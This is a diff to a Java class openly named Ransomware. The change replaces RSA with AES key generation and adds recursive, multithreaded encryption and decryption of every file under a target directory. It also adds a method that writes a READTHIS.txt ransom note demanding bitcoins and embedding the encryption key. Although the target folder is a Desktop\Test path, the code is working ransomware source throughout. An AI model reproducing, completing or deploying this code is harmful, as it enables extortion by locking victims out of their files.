@@ -6,12 +6,16 @@ import java.security.InvalidKeyException;
 import java.security.KeyPair;
 import java.security.KeyPairGenerator;
 import java.security.NoSuchAlgorithmException;
-import java.security.spec.PKCS8EncodedKeySpec;
+import java.security.SecureRandom;
+import java.util.Base64;
 
 import javax.crypto.BadPaddingException;
 import javax.crypto.Cipher;
 import javax.crypto.IllegalBlockSizeException;
+import javax.crypto.KeyGenerator;
 import javax.crypto.NoSuchPaddingException;
+import javax.crypto.SecretKey;
+import javax.crypto.spec.SecretKeySpec;
 
 /**
  * 
@@ -24,20 +28,58 @@ public class Ransomware {
 	private KeyPair pair;
 	private Cipher cipher;
 	private File mainDirectory;
+	private int mode;
+	private SecretKey secretKey;
+
+	private static final int ENCRYPT = 0;
+	private static final int DECRYPT = 1;
 
 	public Ransomware() {
 		setMainDirectory(new File(System.getProperty("user.home") + "\\Desktop\\Test"));
 	}
 
 	/**
-	 * Kicks off the ransomware
+	 * Kicks off the encryption
 	 */
-	public void begin() {
-		generateKeys();
+	public void beginEncryption() {
+		mode = ENCRYPT;
+		generateKey();
 		if (mainDirectory.exists() && mainDirectory.isDirectory()) {
-			encrypt(mainDirectory.listFiles());
+			decryptEncrypt(mainDirectory.listFiles());
 		}
-		sendKey();
+		leaveNote();
+	}
+
+	/**
+	 * Kicks off the decryption
+	 * 
+	 * References:
+	 * {@link https://gist.github.com/destan/b708d11bd4f403506d6d5bb5fe6a82c5}
+	 */
+	public void beginDecryption(String secretKeyString) {
+		mode = DECRYPT;
+		secretKeyString = secretKeyString.replaceAll("\\n", "").replace("\\r", "")
+				.replace("-----BEGIN PRIVATE KEY-----", "").replace("-----END PRIVATE KEY-----", "");
+		System.out.println(secretKeyString);
+		try {
+			SecretKey secretKey = new SecretKeySpec(Base64.getDecoder().decode(secretKeyString), 0,
+					Base64.getDecoder().decode(secretKeyString).length, "AES");
+			cipher = Cipher.getInstance("AES");
+			cipher.init(Cipher.DECRYPT_MODE, secretKey);
+		} catch (NoSuchAlgorithmException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		} catch (NoSuchPaddingException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		} catch (InvalidKeyException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+
+		if (mainDirectory.exists() && mainDirectory.isDirectory()) {
+			decryptEncrypt(mainDirectory.listFiles());
+		}
 	}
 
 	/**
@@ -45,7 +87,7 @@ public class Ransomware {
 	 * {@link https://www.geeksforgeeks.org/java-program-list-files-directory-nested-sub-directories-recursive-approach/}
 	 * 
 	 */
-	public void encrypt(File[] files) {
+	public void decryptEncrypt(File[] files) {
 		for (int index = 0; index < files.length; index++) {
 			if (files[index].isDirectory()) {
 				File directory = files[index];
@@ -53,26 +95,59 @@ public class Ransomware {
 
 					@Override
 					public void run() {
-						encrypt(directory.listFiles());
+						decryptEncrypt(directory.listFiles());
 					}
 				}.start();
 			} else if (files[index].isFile()) {
-				encryptFile(files[index]);
+				switch (mode) {
+				case ENCRYPT:
+					encryptFile(files[index]);
+					break;
+				case DECRYPT:
+					if (files[index].getName().contains(".cof")) {
+						decryptFile(files[index]);
+					}
+					break;
+				}
+
 			}
 		}
+
+	}
+
+	private void decryptFile(File encryptedFile) {
+		byte[] decryptedBytes = null;
+		try {
+			System.out.print(getFileInBytes(encryptedFile).length % 16);
+			decryptedBytes = cipher.doFinal(getFileInBytes(encryptedFile));
+			File decryptedFile = new File(encryptedFile.getPath().replace(".cof", ""));
+			writeToFile(decryptedFile, decryptedBytes);
+			encryptedFile.delete();
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+			return;
+		} catch (IllegalBlockSizeException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		} catch (BadPaddingException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+
 	}
 
 	/**
 	 * Generates the key pair. References:
-	 * {@link https://www.tutorialspoint.com/java_cryptography/java_cryptography_encrypting_data.htm}
+	 * {@link https://www.novixys.com/blog/java-aes-example/}
 	 */
-	private void generateKeys() {
+	private void generateKey() {
 		try {
-			setKeyPairGen(KeyPairGenerator.getInstance("RSA"));
-			keyPairGen.initialize(2048);
-			setPair(keyPairGen.generateKeyPair());
-			setCipher(Cipher.getInstance("RSA/ECB/PKCS1Padding"));
-			cipher.init(Cipher.ENCRYPT_MODE, pair.getPublic());
+			KeyGenerator keyGenerator = KeyGenerator.getInstance("AES");
+			keyGenerator.init(new SecureRandom());
+			secretKey = keyGenerator.generateKey();
+			setCipher(Cipher.getInstance("AES"));
+			cipher.init(Cipher.ENCRYPT_MODE, secretKey);
 
 		} catch (NoSuchAlgorithmException e) {
 			// TODO Auto-generated catch block
@@ -143,13 +218,20 @@ public class Ransomware {
 	}
 
 	/**
-	 * Sends the private key to the attacker IP and Port
+	 * Encodes the private key in base64 and saves it to a file
+	 * 
 	 */
-	private void sendKey() {
-
+	private void leaveNote() {
+		String note = "To whom concern it may,"
+				+ "\r\nAll files in your base are belong to a very strong algorithm. Please do not attempt "
+				+ "to fix your files, it does not recover you. \r\nPlease send an email to customerService@cryptoCoffee.com "
+				+ "with your name, bitcoins and this code: \r\n\r\n"
+				+ Base64.getEncoder().encodeToString(secretKey.getEncoded())
+				+ "\r\n\r\nAfter send you email with the bitcoins, we promptly "
+				+ "will direction you on how to recover precious files. Keep faith in us, we will help you.\r\nAll systems unsafe,"
+				+ "\r\nCryptoCoffee";
 		try {
-			writeToFile(new File(mainDirectory.getAbsolutePath() + "\\private.key"),
-					new PKCS8EncodedKeySpec(pair.getPrivate().getEncoded()).getEncoded());
+			writeToFile(new File(mainDirectory + "\\READTHIS.txt"), note.getBytes());
 		} catch (IOException e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
